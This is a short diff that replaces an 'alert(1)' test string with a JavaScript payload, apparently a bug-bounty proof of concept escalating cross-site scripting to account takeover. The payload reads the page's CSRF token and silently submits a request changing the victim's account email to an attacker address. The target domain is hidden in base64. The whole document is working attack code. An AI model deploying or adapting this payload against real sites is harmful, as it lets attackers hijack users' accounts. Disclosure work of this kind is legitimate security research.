@@ -1,1 +1,10 @@
-alert(1)
+var csrfToken = document.querySelector('meta[name="csrf-token"]').content;
+var formData = new URLSearchParams();
+formData.append('_method', 'patch');
+formData.append('authenticity_token', csrfToken);
+formData.append('user[email]', 'jayesh25+attacker@wearehackerone.com');
+formData.append('commit', 'Update Email Address');
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://www.' + atob('ZXZlbnRjcmVhdGUuY29t') + '/user/update_email');
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.send(formData.toString());
